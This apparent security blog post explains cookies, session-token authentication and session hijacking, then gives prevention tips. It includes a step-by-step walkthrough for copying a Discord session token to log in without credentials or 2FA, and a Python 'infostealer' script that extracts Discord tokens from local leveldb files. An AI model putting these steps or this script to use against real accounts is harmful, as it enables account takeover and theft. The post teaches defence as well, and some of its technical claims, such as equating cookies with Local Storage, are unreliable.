---
title: "Session Hijacking: Hacker's way to get access to any online account"
seoTitle: "Session Hijacking: Hacker's way to get access to any online account"
seoDescription: "Learn about session hijacking, its prevention, and how it exploits HTTP flaws to access online accounts like social media and crypto wallets"
datePublished: Thu Dec 26 2024 23:30:55 GMT+0000 (Coordinated Universal Time)
cuid: cm55yj79d000008k1eqe0fimj
slug: session-hijacking-hackers-way-to-get-access-to-any-online-account
tags: cookies, programming-blogs, http, web-development, security, hacking, cybersecurity-1

---

Session Hijacking is a novel technique that leverage underlying flaws of HTTP. In past, advisories have used session hijacking to hack into *crypto wallets*, *social media accounts including YouTube channels* and even *entire organizations*. For instance, last year the YouTube channel **Linus Tech Tips** got hijacked and suspected the same attack.

This is the part-2 of the series **HTTP for Hacker, Programmers and Everything**. Part-1 covers the basics of HTTP protocol which is necessary to fully understand this attack vector.

In this article, we will explore:

* What is Session Hijacking?
    
* Why Does It Exist?
    
* How to Prevent It?
    

## Why Cookies Were Introduced?

*Cookies are small piece of information stored the browser. Developers also refers cookies as Local Storage.*

Cookies are extremely misinterpreted topic in the general public. It's not uncommon to see comments like "Cookies were made to spy on us", "Of course it's cookies, cause of all the problems". And they are not wrong in their own ways. But nothing can be introduced just for the bad reasons; their has to be some good in it or at least a good narrative. Such as, OpenAI mission is to help people with disabilities not to make big bucks but they are making BIG BUCKS!. Same goes for Microsoft recent feature **Recall**, Recall continuous takes screenshots to help users search things faster without invading users privacy. HOW? Doesn't matter it's a narrative.

But that's not the case with cookies. They were not created with a wrong intention or misleading narrative. In reality, cookies revolutionized the way we use web today and now the entire web depends upon cookies. Story begins in early 1995, when world start needing more complex web-applications. Initially websites only consist HTML, they were sample with few text. You can still visit world's first website at [info.cern.ch](http://info.cern.ch). But as the world progressed people needs also start increasing. We needed websites for more complex tasks such as real-time chatting, user authentication or personalized settings like our favorite dark mode and for that to work a temporary storage was required named as cookies.

### Why Cookies & Not HTTP Headers?

If you have read my [previous blog post](#TODO) on HTTP then you already know that HTTP is a **stateless protocol**. HTTP can't keep track of any relation or data between requests. For instance, a website supports dark mode. You click on dark mode toggle and it will send a HTTP request to server for no reason because dark mode functionality reside on frontend side. When browser get response from server it set website theme in dark mode. Then you make an another request and website get back to light mode again. Because it won't remember what you did before. Now let's take the same example with cookies in action. You click on dark mode toggle and website cookies has a variable `THEME=light` now it is set to `THEME=dark`. Now it doesn't matter if you refresh or make a new request. This theme information is stored in browser and it will only change when you click on dark mode toggle again.

## How Does Authentication Works in HTTP?

One of the core functionality cookies enabled us was to authenticate user on websites. Before their wasn't any proper authentication mechanism, if you try to authenticate then user have to enter credentials for every request because HTTP is a stateless protocol - every request had to authenticate individually. Up until cookies was introduced, now browsers can store information so instead of entering credentials every time for each request, it possible to store those credentials in cookies and let browser append those credentials (stored as cookies) to each HTTP request as header. And this all became possible without modifying the HTTP protocol.

Above explanation is just an overview of "How authentication came in existence (in web) and how authentication implementation would look like". But still we are missing few aspects such as: It not an good idea to store credentials in cookies as plain text cause of obvious security concerns.

So, Let's understand step-by-step "How does authentication really take place in HTTP?":

**Step 1:** Client sends a request to server granting access to admin page with no authentication information.

**Step 2:** Server responds with 401 Unauthorized status code, indicating user is not authenticated.

Server response header would include `WWW-Authenticate` header specifying the supported authentication methods (e.g., Basic Auth, Digest, Kerberos).

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="#TODO: Use Burp to See"
Content-Type: text/html; charset=UTF-8

<h2>Unauthorized Access</h2>
<p>You need to authenticate to access admin portal.</p>
```

**Step 3:** For basic auth, the client will encode the credentials such as username and password in Base64 attached with `Authorization` request header and send it to the server.

```http
GET /protected/resource HTTP/1.1
Host: example.com
Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
```

**Step 4:** The server verifies the received credentials from the internal user database. If credentials are valid server will respond with randomly generated session token.

In below example server included `Set-Cookie` header, where `session_token` is key and `bDBiTGlqejVoczUiXVtaL24udldZSUK` as value or token. Key is not restricted to named as `session_token` it could be `session` or just `token`, different websites use different variations.

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session_token=bDBiTGlqejVoczUiXVtaL24udldZSUK;
```

**Step 5:** Now browser will store session token as cookies and for each subsequent request the client sends the stored session token back to the server as a header. The server verifies the session token against its internal session management system. If the session token is valid, the server grants access to the requested resource.

```http
GET /another/resource HTTP/1.1
Host: example.com
Cookie: session_token=bDBiTGlqejVoczUiXVtaL24udldZSUK
```

That's how authentication works in HTTP and now you understand "How cookies overcome the limitation of stateless nature of HTTP?".

## Session Hijacking: Hacking Discord and Spotify

**Session Token** is the backbone of WWW authentication. The idea of Session Hijacking is extremely simple, *steal the tokens*. Once a user authenticate to a website in the case discord, it's session token will be store in browser cookies that can easily be grabbed. If a threat actor gets hold of session token she can easily hack into user's discord account without needing any credentials.

### Discord via Browser

**Step 1:** Open Discord in your browser and log in.

**Step 2:** Press F12 or right-click and select "Inspect" to open developer tools.

**Step 3:** Switch to the "Application" or "Storage" tab.

**Step 4:** Look for "Local Storage" and find the `token` key.

**Step 5:** Expand the `discord` key to view the session token.

**Step 6:** Open a private window or a different browser.

**Step 7:** Go-to the same location **Storage &gt; Local Storage**.

**Step 8:** Create a new *key-pair*: `token` as key and copied session token as `vaule`.

**Step 9:** Hit refresh and click on top-right conor button `Open Discord`.

**Step 10:** Voila! You are logged in without needing any credentials, even 2FA bypass.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1734349679185/1145c666-0ed9-4d56-b9ab-acbc830c47de.png align="center")

### Discord Desktop Application

Mostly hackers use automated scripts or programs to steal tokens instead of doing manually. Below script allow users to extract session tokens from Discord desktop client.

```python
def get_token(path):
    if not os.path.exists(path): return

    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        print(token)

get_token(path="~/.config/discord/Local Storage/leveldb")

# Linux: `~/.config/discord/Local Storage/leveldb`
# MacOS: `~/Library/Application Support/discord/Local Storage/leveldb`
# Windows: `%APPDATA%\Discord\Local Storage/leveldb`
```

Run the script:

```bash
python discord_infostealer.py
```

### Spotify: Session Token for Privacy & Security

Spotube is a privacy focused Spotify client which block ads and remove many spotify's restrictions in free plan. But, to load your spotify playlists, liked song, and recommendation. Spotube needs spotify account access. Usually it's done by provide credentials to third-party in this case Spotube. Which is really uncomfortable, because by doing so you're trusting Spotube with your `email` and `password`. So, Instead of that, Spotube asks you to enter *Session Token* instead of spotify credentials this way spotube can fetch your music preferences from spotify without reveling credentials.

> **Note:** This is only true for older versions of Spotube's desktop client, not mobile clients.

## Prevent Session Hijacking

Session hijacking or token stealing is a powerful and stealthy attack. But it require access to the system whether it's physical or remote. At the same, prevention of this attack needs attentions both sides User's side and developer side, more on developer.

### Developer & User's Responsibility

1. Physical Access
    
    * Don't allow anyone access to your hardware, anyone!
        
    * If it's not possible, **logout every time**, when you're done.
        
    * Remember Often, Those Closest to You Make You More Vulnerable Than You Realize.
        
2. Remote Access
    
    * Think twice before installing any application because most applications have file-system access. That means discord can hack into your spofity if they want to or vice versa.
        
    * Don't just relay on Antivirus because read file on system is not a malicious activity.
        
    * **Logout every time**, when you're done. If possible **Logout from all devices** frequently.
        
3. Secure Development
    
    * Regenerating session IDs after a user logs in.
        
    * Give option to revoke all session after password reset.
        
    * Using secure cookies (e.g., HttpOnly, Secure)
        
        * HttpOnly cookies are not accessible through JavaScript and are only transmitted over HTTP.
            
        * Hence it is also important to use secure protocols (HTTPS) to transmit cookies.
            
    * Implementing session timeouts and expiration
        
    * Use secure authentication mechanisms, such as OAuth or OpenID Connect, to prevent unauthorized access.
        

## Logout vs Clear Browser History

When I ask my friends, “What’s the best way to protect from hacker?” Option A: *Logout*, Option B: **Clear History**. Their go-to answer is almost always, “Clear browser history.” Makes sense, right? No history, no problems. Except, uh, no. While clearing history does help protect your privacy and chances of getting new tokens stolen, but what about those that are already stolen by hacker? So from a security standpoint, it’s not the silver bullet they think it is.

Here’s the deal: hackers who get hold of your device can steal your session tokens, which are basically golden tickets that let them bypass your passwords and multi-factor authentication. But twist is, logging out kills those tokens. If your account has been compromised but the hacker hasn’t changed the password, you can still kick him out by logging out from your device. This will expires their session token so they cannot continue accessing your account and gives you a chance to secure it. So, when it comes to security of your accounts, logging out is even more crucial.

> **Tips for Developers:** Never let users change the password without confirming current password.

Here’s What I Personally Recommend:

* Enable `Clear History on Exit` feature in your browser (note: this feature is not available in Google Chrome).
    
* Make logging out a habit—every time, even before clearing history.
    

## Conclusion

Session Hijacking is a significant security threat that exploits the flaws of the HTTP protocol. By understanding how session tokens work and the potential risks associated with them, both users and developers can take proactive measures to protect against such attacks. Users should be vigilant about their online activities, ensuring they log out of accounts and avoid installing untrusted applications.

Developers, on the other hand, should implement robust security practices, such as using secure cookies, regenerating session IDs, and enforcing session timeouts. By working together, we can mitigate the risks of session hijacking and enhance the overall security of web applications.

For further insights into the foundational concepts of HTTP that are essential for understanding session hijacking, be sure to check out part-1 of this series, "HTTP for Hackers and Developers."